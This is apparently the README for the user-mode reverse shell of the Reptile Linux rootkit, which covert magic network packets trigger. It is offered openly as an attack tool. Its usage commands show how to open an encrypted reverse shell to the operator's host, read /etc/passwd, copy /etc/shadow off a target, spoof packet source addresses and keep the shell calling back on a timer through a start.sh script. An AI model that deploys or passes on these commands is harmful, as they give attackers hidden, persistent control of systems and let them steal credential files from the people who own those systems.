# Reptile Shell

This shell is a user-mode-helper called by Reptile Kernel Module when is triggered with a magic ICMP/TCP/UDP packet. Based on Tiny SHell by Christophe Devine. Thanks Christophe! ;)

## Features

- Full TTY/PTY encrypted shell
- Download/Upload files
- Run standalone commands
- Loop to connect back each X times (not default)

## Usage

- To send magic packets and get a shell:
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port>
```
- To run standalone command (pay attention on quotes):
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "cat /etc/passwd" 
```
- To download/upload a file (pay attention on quotes):
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "get /etc/shadow /tmp"
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "put file.txt /root"
```
- To just stay listening connections:
```
./reptile_client -t <target IP> -x listen -l <your IP> -p <your port>
```
- If you wanna spoof the source IP address of magic packets, use: `-s <spoof IP>`
- You can configure `start.sh` to always start reptile_shell daemon and spawn a reverse shell each X time:
```
#!/bin/bash
#
# You can customize it!

kill -50 0

# Uncomment this line and set the paramethers if you want to spawn
# reptile_shell as a loop that will connect to your host each time
#
# /reptile/reptile_shell -t <ip> -p <port> -r <time in seconds>

kill -49 `ps -ef | grep reptile_shell | grep -v grep | awk '{print $2}'`
```
